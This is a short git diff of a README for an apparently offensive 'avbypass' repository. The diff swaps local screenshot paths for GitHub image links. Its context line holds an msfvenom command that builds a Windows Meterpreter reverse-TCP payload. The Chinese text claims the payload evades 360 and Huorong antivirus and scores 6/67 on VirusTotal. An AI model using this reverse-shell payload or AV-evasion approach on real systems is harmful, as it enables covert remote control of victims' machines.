@@ -12,14 +12,14 @@ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=xxx 
 
 ![](https://github.com/Shu1L/avbypass/blob/main/20211010131838.png)
 
-![](C:\Users\shu1l\Desktop\新建文件夹 (2)\QQ截图20211010131902.png)
+![](https://github.com/Shu1L/avbypass/blob/main/20211010131902.png)
 
 实测在开启360和火绒的情况下msf正常上线
 
-![](C:\Users\shu1l\Desktop\新建文件夹 (2)\QQ截图20211010131740.png)
+![](https://github.com/Shu1L/avbypass/blob/main/20211010131740.png)
 
 virustotal结果 6/67，后续有时间会慢慢修改
 
-![](C:\Users\shu1l\Desktop\新建文件夹 (2)\QQ截图20211010155756.png)# avbypass
+![](https://github.com/Shu1L/avbypass/blob/main/20211010155756.png)# avbypass
 # avbypass
 "# avbypass" 
